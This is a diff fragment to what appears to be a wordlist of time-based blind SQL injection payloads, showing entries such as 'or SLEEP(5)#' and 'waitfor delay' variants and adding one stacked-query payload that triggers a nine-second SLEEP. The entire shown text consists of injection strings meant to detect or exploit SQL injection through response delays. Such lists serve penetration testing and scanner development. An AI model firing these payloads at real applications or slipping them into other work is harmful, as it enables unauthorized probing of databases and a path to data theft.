@@ -57,6 +57,7 @@ or SLEEP(5)#
 or SLEEP(5)--
 or SLEEP(5)="
 or SLEEP(5)='
+;SELECT IF((8303>8302),SLEEP(9),2356)#
 waitfor delay '00:00:05'
 waitfor delay '00:00:05'--
 waitfor delay '00:00:05'#
